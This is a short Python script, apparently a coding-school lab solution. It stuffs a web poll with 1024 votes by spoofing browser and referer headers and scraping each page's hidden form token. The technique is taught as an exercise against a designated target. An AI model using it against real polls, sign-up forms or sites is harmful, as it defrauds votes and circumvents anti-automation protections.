#!/usr/bin/python3
# 1024.py
# Danisile Jiyane <danisilejiyane2@gmail.com>
"""Hodor with my Holberton ID 1024 times."""
import requests
from bs4 import BeautifulSoup

php = "http://158.69.76.135/level2.php"
user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) "
              "Gecko/20100101 Firefox/64.0")
header = {
    "User-Agent": user_agent,
    "referer": php
}
vote = {
    "id": "375",
    "holdthedoor": "Submit",
    "key": ""
}

if __name__ == "__main__":
    for i in range(0, 1024):
        session = requests.session()
        page = session.get(php, headers=header)
        soup = BeautifulSoup(page.text, "html.parser")

        hidden_value = soup.find("form", {"method": "post"})
        hidden_value = hidden_value.find("input", {"type": "hidden"})
        vote["key"] = hidden_value["value"]

        session.post(php, headers=header, data=vote)
